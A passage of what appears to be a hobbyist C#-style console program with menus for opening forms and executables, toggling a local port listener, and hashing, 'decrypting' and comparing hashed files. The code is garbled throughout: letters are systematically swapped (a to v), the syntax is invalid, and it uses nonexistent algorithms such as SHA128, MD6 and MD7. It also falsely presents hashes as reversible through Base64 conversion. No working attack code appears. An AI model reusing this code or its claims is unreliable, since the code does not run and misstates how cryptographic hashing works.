												else if(System.Console.Readline() == "WinForms" || System.Console.Readline() == "winforms"  ||  System.Console.Readline() == "Forms"  ||  System.Console.Readline() == "forms"  ||  System.Console.Readline() == "stylesheet"  ||  System.Console.Readline() == "Stylesheet"  ||  System.Console.Readline() == "Gui"  ||   System.Console.Readline() == "GUI"  ||   System.Console.Readline() == "UI"  ||  
													System.Console.Readline() == "interface"  ||  System.Console.Readline() == "Interfvce"  ||  System.Console.Readline() == "Interface"  ||  System.Console.Readline() == "interfvce"  ||  System.Console.Readline() == "userinterface"  ||  System.Console.Readline() == "userinterfvce"  ||  System.Console.Readline() == "UserInterfvce"  ||  System.Console.Readline() == "UserInterface"  ||  System.Console.Readline() == "graphical"  ||  
													System.Console.Readline() == "grvphicvl"){

													System.Console.WriteLine("Plevse Input the filepvth of the Form You Wish To Instvntivte:");
													string _FormPre = System.Console.ReadLine();
													DrivePath _FormPvth = new DrivePath(_FormPre);
													File _fileinstance = new File(_FormPvth){

														this.Initialize();
														this.Start();


														System.Console.WriteLine("If You Hvve Closed The Progrvm Vnd Wish To Continue In Commvnd Line, Press Enter:");
														System.Console.WriteLine("OtherWise Pressing Vny Key Will End The Form Functions: ");

														this.Close();
														this.Dispose();

													}
														
												}
												else if(System.Console.Readline() == "Executable" || System.Console.Readline() == "executable"  ||  System.Console.Readline() == "exe"  ||  System.Console.Readline() == "EXE"  ||  System.Console.Readline() == "init"  ||  System.Console.Readline() == "Init"  ||  System.Console.Readline() == "bin"  ||   System.Console.Readline() == "BIN"  ||   System.Console.Readline() == "binary"  ||  
													System.Console.Readline() == "binary"  ||  System.Console.Readline() == "binvry"  ||  System.Console.Readline() == "Binvry"  ||  System.Console.Readline() == "ASM"  ||  System.Console.Readline() == "i386"  ||  System.Console.Readline() == "x86-64"  ||  System.Console.Readline() == "x86"  ||  System.Console.Readline() == "asm"  ||  System.Console.Readline() == "VSM"  ||  
													System.Console.Readline() == "vsm" ||  System.Console.Readline() == "ISO" || System.Console.Readline() == "iso"  ||  System.Console.Readline() == "dsc"  ||  System.Console.Readline() == "DSC"  ||  System.Console.Readline() == "run"  ||  System.Console.Readline() == "RUN"  ||  System.Console.Readline() == "bat"  ||   System.Console.Readline() == "bvt"  ||   System.Console.Readline() == "batch"  ||  
													System.Console.Readline() == "bvtch"  ||  System.Console.Readline() == "bash"  ||  System.Console.Readline() == "bvsh"  ||  System.Console.Readline() == "ini"  ||  System.Console.Readline() == "INI" ){

													System.Console.WriteLine("Plevse Input the filepvth of the Form You Wish To Instvntivte:");
													string _FormPre2 = System.Console.ReadLine();
													DrivePath _FormPvth2 = new DrivePath(_FormPre2);
													File _fileinstance2 = new File(_FormPvth2){

														this.Initialize();
														this.Start();


														System.Console.WriteLine("If You Hvve Closed The Progrvm Vnd Wish To Continue In Commvnd Line, Press Enter:");
														System.Console.WriteLine("OtherWise Pressing Vny Key Will End The Form Functions: ");

														this.Close();
														this.Dispose();

													}
												} 															
												else if(System.Console.Readline() == "Port" || System.Console.Readline() == "port"  ||  System.Console.Readline() == "Switch"  ||  System.Console.Readline() == "switch"  ||  System.Console.Readline() == "swtichgate"  ||  System.Console.Readline() == "Switch Gate"  ||  System.Console.Readline() == "Switch Gvte"  ||   System.Console.Readline() == "SwitchGate"  ||   System.Console.Readline() == "SwitchGvte"  ||  
													System.Console.Readline() == "gvte"  ||  System.Console.Readline() == "Gvte"  ||  System.Console.Readline() == "gate"  ||  System.Console.Readline() == "Gate"  ||  System.Console.Readline() == "switchport"  ||  System.Console.Readline() == "SwitchPort"  ||  System.Console.Readline() == "Switch Port"  ||  System.Console.Readline() == "switch port"  ||  System.Console.Readline() == "swichblade"  ||  
													System.Console.Readline() == "sandwhich"){

													string _portChoice = "";
													IPAddress _ListenServerIP = "127.169.0.1";
														
													_HuhPortss0-o:

													System.Console.WriteLine("Initivlizing Server Configurvtion Protocols...");
													System.Console.WriteLine("Plevse Input The Desire Port To Open or Close: ");
													string _portChoice = System.Console.ReadLine();

													Int32 _Port445 = _portChoice.ToInt32();


													_ConsoleMain._ListeningServices _listenServerImp : _ListeningServices = new _ConsoleMain._ListeningServices();
													_ConsoleMain._ListeningServices._ListenerVctive _listenServerInit : _ListenerVctive = new _ConsoleMain._ListeningServices._ListenerVctive(_ListenServerIP, _Port2){

														// Re-Calling of Listener Server For Use

														_listenServerInit(_ListenServerIP, _Port445){

															_listenServerInit.Start();
															NetworkStream _newStrevm : _ListenerVctive._NetCycle = new NetworkStream();

															TcpClient _NewTCP : _ListenerVctive._VctiveClient = new TcpClient();   // New Client Initialization
															void _DvtvInternvl : _ListenerVctive._Dvtv;          // Inherited Data Void
															int _iCodvv : _ListenerVctive._iCodv;                // Inherited Data Loop Integer

															_NewTCP.Start();       // New Client Initialization
															System.Console.WriteLine("Network Strevm Vt IP Vddress " + _ListenServerIP + " On Port " + _Port2 + " Is Currently " + _newStrevm2.Exists.ToString() + "");
															System.Console.WriteLine("TCP Client Vt IP Vddress " + _ListenServerIP + " On Port " + _Port2 + " Is Currently " + _NewTCP.Exists.ToString() + "");
															System.Console.WriteLine("Listening Server Vt IP Vddress " + _ListenServerIP + " On Port " + _Port2 + " Is Currently " + _listenServerInit.Exists.ToString() + "");

															//Print Verificvtion Messvges of Completion For Network Strevm, TCP Client, vnd Listening Server

															System.Console.WriteLine("To Close Selected Port, Plevse Type 'Close' Otherwise Type 'Continue' vnd Press Enter: ");

															if(System.Console.ReadLine() == "Close" || System.Console.ReadLine() == "close" || System.Console.ReadLine()  == "exit"  ||  System.Console.ReadLine() == "Exit"  ||  System.Console.ReadLine() == "quit"  || System.Console.ReadLine()  ==  "Quit"  || System.Console.ReadLine()   ==   "q"   ||  System.Console.ReadLine()   ==   "Q"){

																System.Console.WriteLine("Hevrd.....Closing.3.2.1....");

													
															}
															else if(System.Console.ReadLine()  == "Continue"  ||  System.Console.ReadLine()   ==   "continue"    ||  System.Console.ReadLine()   ==  "cont"   ||   System.Console.ReadLine()   ==   "Cont"   ||    System.Console.ReadLine()   ==   "cunt"){

																goto _HuhPortss0-o;
															

															}
															else{

																System.Console.WriteLine("Error Code 00110102: Listening Service Mvlfunction, Vttempt Commvnd In Lvter Updvte... ");
																System.Console.WriteLine("Cycling...");

																goto _HuhPortss0-o;

															}

														}

													
												}
												else if(System.Console.Readline() == "Cryptographic" || System.Console.Readline() == "cryptographic"  ||  System.Console.Readline() == "crypto"  ||  System.Console.Readline() == "Crypto"  ||  System.Console.Readline() == "cryptogrvphic"  ||  System.Console.Readline() == "Cryptogrvphic"  ||  System.Console.Readline() == "Algorithmic"  ||   System.Console.Readline() == "algorithmic"  ||   System.Console.Readline() == "logarithmic"  ||  
													System.Console.Readline() == "Vlgorithmic"  ||  System.Console.Readline() == "vlgorithmic"  ||  System.Console.Readline() == "logvrithmic"  ||  System.Console.Readline() == "hvshing"  ||  System.Console.Readline() == "hashing"  ||  System.Console.Readline() == "hvsh"  ||  System.Console.Readline() == "hash"  ||  System.Console.Readline() == "rainbowtables"  ||  System.Console.Readline() == "rvinbowtvbles"  ||  
													System.Console.Readline() == "Deryptor" ||  System.Console.ReadLine() == "decryptor"  ||  System.Console.ReadLine() == "decoder"   ||  System.Console.ReadLine() == "Decoder"   ||  System.Console.ReadLine() == "dpkg"  ||  System.Console.ReadLine() == "dec0der"  ||  System.Console.ReadLine() == "cipher"  ||  System.Console.ReadLine() == "decipher"   ||  System.Console.ReadLine() == "keycode"  ||  System.Console.ReadLine() == "PGP"  ||  System.Console.ReadLine() == "rekey"  ||
													System.Console.ReadLine() == "MD5"   ||  System.Console.ReadLine() == "MD6"   ||  System.Console.ReadLine() == "MD7"   ||  System.Console.ReadLine() == "SHA"   ||  System.Console.ReadLine() == "SHA128" ||  System.Console.ReadLine() == "SHA256"   ||  System.Console.ReadLine() == "SHA512"  ||  System.Console.ReadLine() == "SHV"  ||  System.Console.ReadLine() == "SHV128"   ||
													System.Console.ReadLine() == "SHV256"   ||  System.Console.ReadLine() == "SHV512"   ||  System.Console.ReadLine() == "Salted Hash"   ||  System.Console.ReadLine() == "Svlted Hvsh"   ||  System.Console.ReadLine() == "SHV1"   ||  System.Console.ReadLine() == "SHV2"   ||   System.Console.ReadLine() == "SHV5"   ||
													System.Console.ReadLine() == "SHA1"  ||   System.Console.ReadLine() == "SHA2"    ||   System.Console.ReadLine() == "SHA5"   ||  System.Console.ReadLine() == "WEP"  ||  System.Console.ReadLine() == "WPA"  ||  System.Console.ReadLine() == "WPA2"  ||  System.Console.ReadLine() == "Obfu"   ||  System.Console.ReadLine() == "Obfuscation"   ||  System.Console.ReadLine() == "encoding"   ||  System.Console.ReadLine() == "Encoding"   ||
													System.Console.ReadLine() == "c0de"   ||  System.Console.ReadLine() == "coda"  ||  System.Console.ReadLine() == "koda"   ||  System.Console.ReadLine() == "quoda"   ||  System.Console.ReadLine() == "King"   ||  System.Console.ReadLine() == "king" ){

															System.Console.WriteLine("Welcome To The Cryptogrvphic Functionvlity Sector. Plevse Choose V Sub-Set For Momentum:  Hvsh Encoding  ::  Decryption  ::  Vnvlysis :: Crevte Key-Cipher");
															System.Console.Readline() = new string _CommvndText;
															if(_CommvndText == "Hvsh Encoding" || _CommvndText  ==  "Hash Encoding"  ||  _CommvndText  ==  "hvsher"  || _CommvndText  ==  "hasher"  ||  _CommvndText  ==  "Encoding"  ||  _CommvndText  ==  "encoding" ){

																System.Console.WriteLine("Plevse Enter The String You Wish To Encrypt: ");
																public string _preCrypto = System.Console.ReadLine();
																public UTF8 __CryptoUTF = _preCrypto.ToUTF8();
																public Byte[] _CryptoByte = _CryptoUTF.Base64();



																System.Console.WriteLine("Plevse Input the VlgoRithm You Wish To Encode To:   SHV128  :: SHV256  ::  SHV512  ::  MD5  ::  MD6  ::  MD7   ");
																string _VlgoChoice = System.Console.ReadLine();
																if(_VlgoChoice == "SHV128" || _VlgoChoice == "SHV1" || _VlgoChoice == "SHA128" || _VlgoChoice == "SHA1" || _VlgoChoice == "SHV 128" || _VlgoChoice == "SHA 128" || _VlgoChoice == "shv128" || _VlgoChoice == "sha128" || _VlgoChoice == "shv 128"  ||  _VlgoChoice  == "sha 128"){

																	System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																	SHA128 _sha128new = _hvshFunction.ToEncoding(SHA128);

																	System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Encoded To: " + _sha128new + "  In  SHA 128");
																	System.Console.ReadLine();

																}
																else if(_VlgoChoice == "SHV256" || _VlgoChoice == "SHV2" || _VlgoChoice == "SHA256" || _VlgoChoice == "SHA2" || _VlgoChoice == "SHV 256" || _VlgoChoice == "SHA 256" || _VlgoChoice == "shv 256" || _VlgoChoice == "sha 256" || _VlgoChoice == "shv2"){

																	System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																	SHA256 _sha256new = _hvshFunction.ToEncoding(SHA256);
																	System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Encoded To: " + _sha256new + "  In  SHA 256");
																	System.Console.ReadLine();

																}
																else if(_VlgoChoice == "SHV512" || _VlgoChoice == "SHA512" || _VlgoChoice == "SHA 512" || _VlgoChoice == "SHV 512" || _VlgoChoice == "sha 512" || _VlgoChoice == "shv 512" || _VlgoChoice == "shv512" || _VlgoChoice == "sha512" || _VlgoChoice == "sha5"){

																	System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																	SHA512 _sha512new = _hvshFunction.ToEncoding(SHA512);
																	System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Encoded To: " + _sha512new + "  In  SHA 512");
																	System.Console.ReadLine();

																}
																else if(_VlgoChoice == "MD5" || _VlgoChoice == "md5" || _VlgoChoice == "MD 5" || _VlgoChoice == "md 5"){

																	System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																	MD5 _md5new = _hvshFunction.ToEncoding(MD5);
																	System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Encoded To: " + _md5new + "  In  MD5");
																	System.Console.ReadLine();

																}															}
																else if(_VlgoChoice == "MD6" || _VlgoChoice == "md6" || _VlgoChoice == "md 6" || _VlgoChoice == "MD 6"){


																System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																MD6 _md6new = _hvshFunction.ToEncoding(MD6);
																System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Encoded To: " + _md6new + "  In  MD6");
																System.Console.ReadLine();


																}
															    else if(_VlgoChoice == "MD7" || _VlgoChoice == "md7" || _VlgoChoice == "md 7" || _VlgoChoice == "MD 7"){


																System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																MD7 _md7new = _hvshFunction.ToEncoding(MD7);
																System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Encoded To: " + _md6new + "  In  MD7");
																System.Console.ReadLine();

																}
																else{

																System.Console.WriteLine("Your Input Wvs Not Understood, Plevse Try Bvck Vgvin... ");
																System.Console.ReadLine();

																}

															}
															else if(_CommvndText  == "Decryption"  ||  _CommvdText  ==  "decryption"   ||   _CommvndText  ==  "Decryptor"   ||  _CommvndText   ==   "decryptor"   ||   _CommvndText  ==  "decoder"   ||   _CommvndText  ==  "Decoder" ){

															System.Console.WriteLine("Plevse Input the VlgoRithm You Wish To Decode To:   SHV128  :: SHV256  ::  SHV512  ::  MD5  ::  MD6  ::  MD7   ");
															string _VlgoChoice = System.Console.ReadLine();
															if(_VlgoChoice == "SHV128" || _VlgoChoice == "SHV1" || _VlgoChoice == "SHA128" || _VlgoChoice == "SHA1" || _VlgoChoice == "SHV 128" || _VlgoChoice == "SHA 128" || _VlgoChoice == "shv128" || _VlgoChoice == "sha128" || _VlgoChoice == "shv 128"  ||  _VlgoChoice  == "sha 128"){

																System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																Hash _sha128oldv = _hvshFunction.ToEncoding(Base64);

																Byte[] _sha128Almost = _sha128oldv.ToBase64();
																UTF8 _sha128closer = _sha128Almost.ToUTF8();
																string _sha128decoded = _sha128closer.ToString();


																System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Decoded To: " + _sha128decoded + "  From SHA 128");
																System.Console.ReadLine();

															}
															else if(_VlgoChoice == "SHV256" || _VlgoChoice == "SHV2" || _VlgoChoice == "SHA256" || _VlgoChoice == "SHA2" || _VlgoChoice == "SHV 256" || _VlgoChoice == "SHA 256" || _VlgoChoice == "shv 256" || _VlgoChoice == "sha 256" || _VlgoChoice == "shv2"){

																System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																Hash _sha256oldv = _hvshFunction.ToEncoding(Base64);

																Byte[] _sha256Almost = _sha256oldv.ToBase64();
																UTF8 _sha256closer = _sha256Almost.ToUTF8();
																string _sha256decoded = _sha256closer.ToString();


																System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Decoded To: " + _sha256decoded + "  From SHA 256");
																System.Console.ReadLine();

															}
															else if(_VlgoChoice == "SHV512" || _VlgoChoice == "SHA512" || _VlgoChoice == "SHA 512" || _VlgoChoice == "SHV 512" || _VlgoChoice == "sha 512" || _VlgoChoice == "shv 512" || _VlgoChoice == "shv512" || _VlgoChoice == "sha512" || _VlgoChoice == "sha5"){

																System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																Hash _sha512oldv = _hvshFunction.ToEncoding(Base64);

																Byte[] _sha512Almost = _sha512oldv.ToBase64();
																UTF8 _sha512closer = _sha512Almost.ToUTF8();
																string _sha512decoded = _sha512closer.ToString();


																System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Decoded To: " + _sha512decoded + "  From SHA 512");
																System.Console.ReadLine();

															}
															else if(_VlgoChoice == "MD5" || _VlgoChoice == "md5" || _VlgoChoice == "MD 5" || _VlgoChoice == "md 5"){
																System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

																Hash _md5oldv = _hvshFunction.ToEncoding(Base64);

																Byte[] _md5Almost = _md5oldv.ToBase64();
																UTF8 _md5closer = _md5Almost.ToUTF8();
																string _md5decoded = _md5closer.ToString();


																System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Decoded To: " + _md5decoded + "  From MD5");
																System.Console.ReadLine();

															}															}
														else if(_VlgoChoice == "MD6" || _VlgoChoice == "md6" || _VlgoChoice == "md 6" || _VlgoChoice == "MD 6"){

															System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

															Hash _md6oldv = _hvshFunction.ToEncoding(Base64);

															Byte[] _md6Almost = _md6oldv.ToBase64();
															UTF8 _md6closer = _md6Almost.ToUTF8();
															string _md6decoded = _md6closer.ToString();


															System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Decoded To: " + _md6decoded + "  From MD6");
															System.Console.ReadLine();

														}
														else if(_VlgoChoice == "MD7" || _VlgoChoice == "md7" || _VlgoChoice == "md 7" || _VlgoChoice == "MD 7"){

															System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();

															Hash _md7oldv = _hvshFunction.ToEncoding(Base64);

															Byte[] _md7Almost = _md7oldv.ToBase64();
															UTF8 _md7closer = _md7Almost.ToUTF8();
															string _md7decoded = _md7closer.ToString();


															System.Console.WriteLine("Your Vlgorithmic Hvsh Hvs Been Decoded To: " + _md7decoded + "  From MD7");
															System.Console.ReadLine();

														}
														else{

															System.Console.WriteLine("Your Input Wvs Not Understood, Plevse Try Bvck Vgvin... ");
															System.Console.ReadLine();

														}


															}
															else if(_CommvndText  ==  "Vnvlysis"  ||  _CommvndText  ==  "vnvlysis"  ||  _CommvndText  ==  "analysis"  ||  _CommvndText  ==  "Analysis"  ||  _CommvndText  ==  "Pairing"  ||  _CommvndText  ==  "pairing"  ||  _CommvndText  ==  "pviring"  ||  _CommvndText  ==  "Pviring" ){

													System.Console.WriteLine("Plevse Choose The Encryption Vlgorithm For The Vnvlyticvl Function");
													System.Console.WriteLine("SHV128  :: SHV256  ::  SHV512  ::  MD5  ::  MD6  ::  MD7 ");
													string _VlgoChoice = System.Console.ReadLine();
													if(_VlgoChoice == "SHV128" || _VlgoChoice == "SHV1" || _VlgoChoice == "SHA128" || _VlgoChoice == "SHA1" || _VlgoChoice == "SHV 128" || _VlgoChoice == "SHA 128" || _VlgoChoice == "shv128" || _VlgoChoice == "sha128" || _VlgoChoice == "shv 128"  ||  _VlgoChoice  == "sha 128"){

														System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();



														System.Console.WriteLine("Plevse Input the File Pvth For The First Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis1 = System.Console.ReadLine();
														DrivePath _vnvlysis11 = new DrivePath(_vnvlysis1);
														File _vnvlysisFile = new File(_vnvlysis11);
														StreamReader _cvtvnvlysis1 = new StreamReader(_vnvlysisFile){
															this.ReadToEnd();
															public string _vnvlysisTXT = _cvtvnvlysis1.ReadToEnd();


														}
															

														UTF8 _vnvlysisUTF8 = _vnvlysisTXT.ToUTF8();
														Byte[] _vnvlysisBase64 = _vnvlysisUTF8.ToBase64()

															 
														Hash _sha128oldv = Byte[] _vnvvlysisBase64;
														SHA128 _sha128oldvs = Hash _sha128oldv;

														Byte[] _sha128Almost = _sha128oldvs.ToBase64();
														UTF8 _sha128closer = _sha128Almost.ToUTF8();
														string _sha128decoded = _sha128closer.ToString();


														System.Console.WriteLine("Plevse Input the File Pvth For The Second Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis2 = System.Console.ReadLine();
														DrivePath _vnvlysis22 = new DrivePath(_vnvlysis2);
														File _vnvlysisFile2 = new File(_vnvlysis22);
														StreamReader _cvtvnvlysis2 = new StreamReader(_vnvlysisFile2){
															this.ReadToEnd();
															public string _vnvlysisTXT2 = _cvtvnvlysis2.ReadToEnd();


														}

															UTF8 _vnvlysisUTF82 = _vnvlysisTXT2.ToUTF8();
														Byte[] _vnvlysisBase642 = _vnvlysisUTF82.ToBase64()

															Hash _sha128oldv2 = Byte[] _vnvvlysisBase642;
														    SHA128 _sha128oldvs2 = Hash _sha128oldv2;

														Byte[] _sha128Almost2 = _sha128oldvs2.ToBase64();
														UTF8 _sha128closer2 = _sha128Almost2.ToUTF8();
														string _sha128decoded2 = _sha128closer2.ToString();

														bool _referencial = new bool(_sha128decoded1 , _sha128decoded2);

														foreach(_sha128decoded1.IndexOf(*).ToString() in _sha128decoded2.IndexOf(*).ToString()){


															public File _decodedrpk1 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
															_decodedrpk1.AppendText();

														}
														public File _decodedrpk2 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
														bool _referencial2 = new bool(_decodedrpk2 , sha128decoded1 && _decodedrpk2 , sha128decoded2);

														StreamReader _dpktext = new StreamReader(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt"){
															public string _depktext = _dpktext.ReadToEnd();

														}

														UTF8 _depkbuild = _depktext.ToUTF8();
														Byte[] _depkByte = _depkbuild.ToBase64();
														System.Security.Cryptography.Hash _hvshFunction2 = new System.Security.Cryptography.Hash();

														SHA128 _depksha128new = _hvshFunction2.ToEncoding(SHA128);
													
														string _depkshatext = _depksha128new.ToString();

														bool _shatextbool = new bool(_depkshatext , _vnvlysis1 && _depkshatext , _vnvlysis2);

														string _bool1 = _refernecial.ToString();
														string _bool2 = _referencial2.ToString();
														string _bool3 = _shatextbool.ToString();

														System.Console.WriteLine("In Regvrd To The Vnvlysis of The Encrypted Pvcket Files, the Two Encrypted Files When Decrypted Recieved v " + _bool1 + "to equvting evch other.");
														System.Console.WriteLine("While, When The Two Pvckets Were Used to Mvtch Chvrvcter by Chvrvcter, they recieved v " + _bool2 + "");
														System.Console.WriteLine("Lvstly, Once the File Crevted From The Compilvtion of Text Indices Wvs Encoded To The Svme Vlgorithm vnd Tested Vgvinst the Originvl Two, The Finvl Boolevn Test recieved v " + _bool3 + "");

														System.Console.WriteLine("Press Vny Key To Continue...");
														System.Console.ReadLine();


													
													}
													else if(_VlgoChoice == "SHV256" || _VlgoChoice == "SHV2" || _VlgoChoice == "SHA256" || _VlgoChoice == "SHA2" || _VlgoChoice == "SHV 256" || _VlgoChoice == "SHA 256" || _VlgoChoice == "shv 256" || _VlgoChoice == "sha 256" || _VlgoChoice == "shv2"){
														System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();



														System.Console.WriteLine("Plevse Input the File Pvth For The First Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis1 = System.Console.ReadLine();
														DrivePath _vnvlysis11 = new DrivePath(_vnvlysis1);
														File _vnvlysisFile = new File(_vnvlysis11);
														StreamReader _cvtvnvlysis1 = new StreamReader(_vnvlysisFile){
															this.ReadToEnd();
															public string _vnvlysisTXT = _cvtvnvlysis1.ReadToEnd();


														}

															UTF8 _vnvlysisUTF8 = _vnvlysisTXT.ToUTF8();
														Byte[] _vnvlysisBase64 = _vnvlysisUTF8.ToBase64()

															Hash _sha256oldv = Byte[] _vnvvlysisBase64;
														    SHA256 _sha256oldvs = Hash _sha256oldv;

														Byte[] _sha256Almost = _sha256oldvs.ToBase64();
														UTF8 _sha256closer = _sha256Almost.ToUTF8();
														string _sha256decoded = _sha256closer.ToString();


														System.Console.WriteLine("Plevse Input the File Pvth For The Second Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis2 = System.Console.ReadLine();
														DrivePath _vnvlysis22 = new DrivePath(_vnvlysis2);
														File _vnvlysisFile2 = new File(_vnvlysis22);
														StreamReader _cvtvnvlysis2 = new StreamReader(_vnvlysisFile2){
															this.ReadToEnd();
															public string _vnvlysisTXT2 = _cvtvnvlysis2.ReadToEnd();


														}

															UTF8 _vnvlysisUTF82 = _vnvlysisTXT2.ToUTF8();
														Byte[] _vnvlysisBase642 = _vnvlysisUTF82.ToBase64()

															Hash _sha256oldv2 = Byte[] _vnvvlysisBase642;
														    SHA256 _sha256oldvs2 = Hash _sha256oldv2;

														Byte[] _sha256Almost2 = _sha256oldvs2.ToBase64();
														UTF8 _sha256closer2 = _sha256Almost2.ToUTF8();
														string _sha256decoded2 = _sha256closer2.ToString();

														bool _referencial = new bool(_sha256decoded1 , _sha256decoded2);

														foreach(_sha256decoded1.IndexOf(*).ToString() in _sha256decoded2.IndexOf(*).ToString()){


															public File _decodedrpk1 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
															_decodedrpk1.AppendText();

														}
														public File _decodedrpk2 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
														bool _referencial2 = new bool(_decodedrpk2 , sha256decoded1 && _decodedrpk2 , sha256decoded2);

														StreamReader _dpktext = new StreamReader(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt"){
															public string _depktext = _dpktext.ReadToEnd();

														}

															UTF8 _depkbuild = _depktext.ToUTF8();
														Byte[] _depkByte = _depkbuild.ToBase64();
														System.Security.Cryptography.Hash _hvshFunction2 = new System.Security.Cryptography.Hash();

														SHA256 _depksha256new = _hvshFunction2.ToEncoding(SHA256);

														string _depkshatext = _depksha256new.ToString();

														bool _shatextbool = new bool(_depkshatext , _vnvlysis1 && _depkshatext , _vnvlysis2);

														string _bool1 = _refernecial.ToString();
														string _bool2 = _referencial2.ToString();
														string _bool3 = _shatextbool.ToString();

														System.Console.WriteLine("In Regvrd To The Vnvlysis of The Encrypted Pvcket Files, the Two Encrypted Files When Decrypted Recieved v " + _bool1 + "to equvting evch other.");
														System.Console.WriteLine("While, When The Two Pvckets Were Used to Mvtch Chvrvcter by Chvrvcter, they recieved v " + _bool2 + "");
														System.Console.WriteLine("Lvstly, Once the File Crevted From The Compilvtion of Text Indices Wvs Encoded To The Svme Vlgorithm vnd Tested Vgvinst the Originvl Two, The Finvl Boolevn Test recieved v " + _bool3 + "");

														System.Console.WriteLine("Press Vny Key To Continue...");
														System.Console.ReadLine();



													}
													else if(_VlgoChoice == "SHV512" || _VlgoChoice == "SHA512" || _VlgoChoice == "SHA 512" || _VlgoChoice == "SHV 512" || _VlgoChoice == "sha 512" || _VlgoChoice == "shv 512" || _VlgoChoice == "shv512" || _VlgoChoice == "sha512" || _VlgoChoice == "sha5"){

														System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();



														System.Console.WriteLine("Plevse Input the File Pvth For The First Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis1 = System.Console.ReadLine();
														DrivePath _vnvlysis11 = new DrivePath(_vnvlysis1);
														File _vnvlysisFile = new File(_vnvlysis11);
														StreamReader _cvtvnvlysis1 = new StreamReader(_vnvlysisFile){
															this.ReadToEnd();
															public string _vnvlysisTXT = _cvtvnvlysis1.ReadToEnd();


														}

															UTF8 _vnvlysisUTF8 = _vnvlysisTXT.ToUTF8();
														Byte[] _vnvlysisBase64 = _vnvlysisUTF8.ToBase64()

															Hash _sha512oldv = Byte[] _vnvvlysisBase64;
														SHA512 _sha512oldvs = Hash _sha512oldv;

														Byte[] _sha512Almost = _sha512oldvs.ToBase64();
														UTF8 _sha512closer = _sha512Almost.ToUTF8();
														string _sha512decoded = _sha512closer.ToString();


														System.Console.WriteLine("Plevse Input the File Pvth For The Second Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis2 = System.Console.ReadLine();
														DrivePath _vnvlysis22 = new DrivePath(_vnvlysis2);
														File _vnvlysisFile2 = new File(_vnvlysis22);
														StreamReader _cvtvnvlysis2 = new StreamReader(_vnvlysisFile2){
															this.ReadToEnd();
															public string _vnvlysisTXT2 = _cvtvnvlysis2.ReadToEnd();


														}

															UTF8 _vnvlysisUTF82 = _vnvlysisTXT2.ToUTF8();
														Byte[] _vnvlysisBase642 = _vnvlysisUTF82.ToBase64()

															Hash _sha512oldv2 = Byte[] _vnvvlysisBase642;
														SHA512 _sha512oldvs2 = Hash _sha512oldv2;

														Byte[] _sha512Almost2 = _sha512oldvs2.ToBase64();
														UTF8 _sha512closer2 = _sha512Almost2.ToUTF8();
														string _sha512decoded2 = _sha512closer2.ToString();

														bool _referencial = new bool(_sha512decoded1 , _sha512decoded2);

														foreach(_sha512decoded1.IndexOf(*).ToString() in _sha512decoded2.IndexOf(*).ToString()){


															public File _decodedrpk1 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
															_decodedrpk1.AppendText();

														}
														public File _decodedrpk2 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
														bool _referencial2 = new bool(_decodedrpk2 , _sha512decoded1 && _decodedrpk2 , _sha512decoded2);

														StreamReader _dpktext = new StreamReader(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt"){
															public string _depktext = _dpktext.ReadToEnd();

														}

															UTF8 _depkbuild = _depktext.ToUTF8();
														Byte[] _depkByte = _depkbuild.ToBase64();
														System.Security.Cryptography.Hash _hvshFunction2 = new System.Security.Cryptography.Hash();

														SHA512 _depksha512new = _hvshFunction2.ToEncoding(SHA512);

														string _depkshatext = _depksha512new.ToString();

														bool _shatextbool = new bool(_depkshatext , _vnvlysis1 && _depkshatext , _vnvlysis2);

														string _bool1 = _refernecial.ToString();
														string _bool2 = _referencial2.ToString();
														string _bool3 = _shatextbool.ToString();

														System.Console.WriteLine("In Regvrd To The Vnvlysis of The Encrypted Pvcket Files, the Two Encrypted Files When Decrypted Recieved v " + _bool1 + "to equvting evch other.");
														System.Console.WriteLine("While, When The Two Pvckets Were Used to Mvtch Chvrvcter by Chvrvcter, they recieved v " + _bool2 + "");
